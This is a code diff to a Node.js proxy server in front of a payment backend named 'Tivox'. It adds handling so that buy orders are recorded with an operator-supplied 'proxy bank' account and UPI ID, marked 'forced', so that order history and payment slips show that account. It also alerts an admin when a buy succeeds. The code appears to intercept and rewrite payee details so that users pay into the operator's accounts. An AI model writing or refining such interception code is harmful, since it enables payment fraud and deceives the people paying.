@@ -1066,13 +1066,18 @@ async function proxyToTivox(req) {
     if (contentEncoding === 'br' || contentEncoding === 'brotli') {
       // Node.js fetch does NOT auto-decompress brotli — do it manually
       const rawBuf = Buffer.from(await response.arrayBuffer());
-      respBody = (await brotliDecompressAsync(rawBuf)).toString('utf8');
+      try {
+        respBody = (await brotliDecompressAsync(rawBuf)).toString('utf8');
+      } catch (brotliErr) {
+        // Brotli failed — return raw bytes (browser can still decode it)
+        respBody = rawBuf.toString('latin1');
+      }
     } else {
       // gzip/deflate/plain — Node.js fetch (undici) auto-decompresses these
       respBody = await response.text();
     }
-  } catch (decompErr) {
-    try { respBody = await response.text(); } catch (e) { respBody = ''; }
+  } catch (outerErr) {
+    respBody = '';
   }
   return { response, respBody, respHeaders };
 }
@@ -1254,32 +1259,34 @@ app.all('/xxapi/*', async (req, res) => {
     );
 
     if (isBuyOrder) {
+      const activeBank = getActiveBank(data, null);
+      const proxyOn = data.botEnabled !== false;
+
+      // ── Extract order/ct fields from request BEFORE backend call ─────────
+      // This ensures reqOrderId is available even if response can't be parsed
+      let reqOrderId = '', reqCtId = '', reqCtType = '';
+      try {
+        const ct = (req.headers['content-type'] || '').toLowerCase();
+        let rb = {};
+        if (ct.includes('multipart') && req.rawBody) {
+          rb = parseMultipartFields(req.rawBody);
+        } else if (ct.includes('json') && req.rawBody) {
+          rb = JSON.parse(req.rawBody.toString());
+        } else if (ct.includes('form') && req.rawBody) {
+          rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
+        }
+        const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
+        reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || rb.id || rb.slipId || qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || qs.get('id') || qs.get('slipId') || '';
+        reqCtId = rb.ct_id || rb.ctId || qs.get('ct_id') || '';
+        reqCtType = rb.ctType || rb.ct_type || rb.payType || qs.get('ctType') || '';
+      } catch (e) { }
+
       const { response: br, respBody: bb, respHeaders: bh } = await proxyToTivox(req);
       let bj = null;
       try { bj = JSON.parse(bb); } catch (e) { }
       if (bj) {
         const origCode = bj.code;
         const origMsg = String(bj.msg || bj.message || '');
-        const activeBank = getActiveBank(data, null);
-        const proxyOn = data.botEnabled !== false;
-
-        // ── Helper: extract order/ct fields from request ──────────────────────
-        let reqOrderId = '', reqCtId = '', reqCtType = '';
-        try {
-          const ct = (req.headers['content-type'] || '').toLowerCase();
-          let rb = {};
-          if (ct.includes('multipart') && req.rawBody) {
-            rb = parseMultipartFields(req.rawBody);
-          } else if (ct.includes('json') && req.rawBody) {
-            rb = JSON.parse(req.rawBody.toString());
-          } else if (ct.includes('form') && req.rawBody) {
-            rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
-          }
-          const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
-          reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || rb.id || rb.slipId || qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || qs.get('id') || qs.get('slipId') || '';
-          reqCtId = rb.ct_id || rb.ctId || qs.get('ct_id') || '';
-          reqCtType = rb.ctType || rb.ct_type || rb.payType || qs.get('ctType') || '';
-        } catch (e) { }
 
         const savedOrder = reqOrderId && data.orderBankMap ? data.orderBankMap[reqOrderId] : null;
         // Amount: try saved map first, then request body, then response data
@@ -1443,9 +1450,44 @@ app.all('/xxapi/*', async (req, res) => {
         }
         return res.status(200).json(bj);
       }
-      bh['content-length'] = String(Buffer.byteLength(bb));
-      res.writeHead(br.status, bh);
-      return res.end(bb);
+
+      // ── bj = null: response couldn't be parsed (brotli-compressed success) ──
+      // Optimistically save bank so history + slip detail always show proxy bank
+      if (reqOrderId && activeBank && proxyOn && !isUsdtBuy) {
+        if (!data.orderBankMap) data.orderBankMap = {};
+        const _CT_PAY_MAP = { 1: 2, 2: 1, 3: 1, 4: 2, 7: 2, 9: 2, 17: 2, 18: 3 };
+        const _parsedCt = reqCtType ? parseInt(reqCtType) : (isOsdtBuy ? 1 : 3);
+        const _derivedPt = isMobiKwikBuy || isOsdtBuy ? 2 : isUsdtBuy ? 0 : (_CT_PAY_MAP[_parsedCt] || 1);
+        data.orderBankMap[reqOrderId] = {
+          bank: `${activeBank.accountHolder} | ${activeBank.accountNo}${activeBank.ifsc ? ' | ' + activeBank.ifsc : ''}`,
+          accountHolder: activeBank.accountHolder || '',
+          accountNo: activeBank.accountNo || '',
+          ifsc: activeBank.ifsc || '',
+          bankName: activeBank.bankName || '',
+          upiId: activeBank.upiId || '',
+          amount: 0,
+          rptNo: reqOrderId,
+          orderNo: reqOrderId,
+          walletDomain: '',
+          payType: _derivedPt,
+          time: now,
+          userId: String(userId || ''),
+          forced: true,
+          isManual: true
+        };
+        notifyAdmin(data,
+          `✅ BUY SUCCESSFUL
+📋 Order: ${reqOrderId}
+💾 Bank saved — history & slip will show proxy bank
+🏦 Bank: ${activeBank.accountHolder} | ${activeBank.accountNo}${activeBank.ifsc ? ' | ' + activeBank.ifsc : ''}
+🕐 ${now}`);
+      }
+      if (bb) {
+        bh['content-length'] = String(Buffer.byteLength(bb));
+        res.writeHead(br.status, bh);
+        return res.end(bb);
+      }
+      return res.sendStatus(200);
     }
 
     // ── paymentslipdetail / order detail intercept — serve from orderBankMap if backend 404s ──
